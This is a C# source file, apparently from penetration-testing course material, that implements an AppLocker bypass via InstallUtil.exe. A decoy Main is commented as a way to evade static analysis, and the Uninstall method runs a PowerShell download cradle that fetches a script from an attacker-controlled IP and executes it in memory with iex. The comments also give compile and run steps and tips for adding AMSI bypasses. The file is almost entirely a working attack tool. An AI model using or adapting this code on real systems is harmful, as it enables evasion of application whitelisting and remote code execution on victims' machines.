// ============================================================
// AppLocker Bypass — InstallUtil via Download Cradle
// ============================================================
// WHAT THIS DOES:
//   Uses the InstallUtil.exe AppLocker bypass (see RUNBOOK.md
//   for explanation of why this works). The payload here is the
//   simplest version: downloads a PS script from a web server
//   and executes it via a PowerShell runspace.
//
// WHEN TO USE:
//   - AppLocker blocks your .exe from running
//   - You want to run a PowerShell script from memory (no disk)
//   - You have a web server to host your PS payload
//
// REQUIREMENTS:
//   - Reference: System.Management.Automation.dll (comes with PS)
//   - Host your PS payload at the URL in 'cmd'
//
// HOW TO COMPILE:
//   csc.exe /unsafe /platform:x64
//           /r:System.Management.Automation.dll
//           /out:installutil-bypass.exe installutil-bypass.cs
//
// HOW TO RUN (AppLocker bypass):
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
//       /logfile= /LogToConsole=false /U installutil-bypass.exe
//
// SETUP:
//   1. Host your script: python3 -m http.server 80 (on Kali)
//   2. Change LHOST in 'cmd' string below
//   3. Compile and run via InstallUtil
// ============================================================

using System;
using System.Management.Automation;          // for PowerShell runspace
using System.Management.Automation.Runspaces; // for RunspaceFactory
using System.Configuration.Install;           // for Installer base class

namespace Bypass
{
    class Program
    {
        // This is the "real" main - it just prints an innocent message.
        // The actual payload runs from the Installer class below.
        // This makes static analysis harder (nothing suspicious in Main).
        static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }

    // -------------------------------------------------------
    // The actual bypass payload
    // -------------------------------------------------------
    // [RunInstaller(true)]: tells InstallUtil.exe that this class
    //   should be instantiated during install/uninstall operations
    // Inherits from Installer: required for InstallUtil to find us
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        // Uninstall() is called by InstallUtil.exe when you pass /U flag
        // This is our code execution entry point
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // -------------------------------------------------------
            // Download and execute a PowerShell script from our server
            // -------------------------------------------------------
            // The PS command:
            //   (New-Object Net.WebClient).DownloadString('URL') | iex
            //
            // This downloads the script as a string (never touches disk)
            // and pipes it to Invoke-Expression (iex) which executes it.
            //
            // CHANGE THIS: Replace 192.168.49.67 with your Kali IP
            // CHANGE THIS: Replace /run.txt with your script path
            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.67/run.txt') | iex";

            // -------------------------------------------------------
            // Create and execute the PS runspace
            // -------------------------------------------------------
            // RunspaceFactory.CreateRunspace(): creates a new PowerShell environment
            // rs.Open(): initializes the runspace
            // PowerShell.Create(): creates a PS automation object
            // ps.Runspace = rs: assigns our runspace (not the constrained system one)
            // ps.AddScript(cmd): queues our download cradle for execution
            // ps.Invoke(): runs it
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();

            // NOTE: The PS runspace here does NOT bypass CLM or AMSI.
            // If CLM is active, you need psbypass.cs instead.
            // If AMSI catches your download, add an AMSI bypass to run.txt first.
        }
    }
}
